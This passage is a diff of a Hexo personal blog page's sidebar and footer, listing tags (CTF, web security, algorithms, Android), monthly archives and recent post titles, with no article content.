href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" rel="tag">教材答案</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" rel="tag">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/APP-Inventor/" style="font-size: 10.83px;">APP Inventor</a> <a href="/tags/Android/" style="font-size: 13.33px;">Android</a> <a href="/tags/C/" style="font-size: 16.67px;">C</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/CSharp/" style="font-size: 10px;">CSharp</a> <a href="/tags/CTF/" style="font-size: 19.17px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 12.5px;">DVWA</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 14.17px;">JavaScript</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/MySQL/" style="font-size: 10.83px;">MySQL</a> <a href="/tags/Reverse/" style="font-size: 11.67px;">Reverse</a> <a href="/tags/Web/" style="font-size: 17.5px;">Web</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/writeup/" style="font-size: 18.33px;">writeup</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" style="font-size: 10.83px;">信息安全数学</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 14.17px;">前端</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 10px;">区块链</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 10.83px;">协议</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15.83px;">密码学</a> <a href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" style="font-size: 13.33px;">库与模块</a> <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" style="font-size: 10.83px;">拒绝服务攻击</a> <a href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" style="font-size: 10px;">教材答案</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 15px;">数据结构</a> <a href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 15px;">牛客网</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 17.5px;">算法</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 16.67px;">经验</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 15.83px;">网络安全</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10.83px;">计算机网络</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" style="font-size: 15.83px;">计算机考研复试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/21/IDA%20Pro%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90dex%E6%96%87%E4%BB%B6/">IDA Pro静态分析dex文件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/13/%E7%BC%96%E5%86%99%E5%B9%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">编写并分析第一个Android应用程序</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/05/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/">Android四大组件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/25/%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6%E6%9C%AC%E7%A7%91%E7%94%9F%E6%B6%AF%E6%80%BB%E7%BB%93/">中国矿业大学本科生涯总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/19/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%80%83%E7%A0%94--%E5%A4%8D%E8%AF%95--%E6%9C%BA%E8%AF%95%E5%88%B7%E9%A2%98/">北京工业大学考研--复试--机试刷题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 iHui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
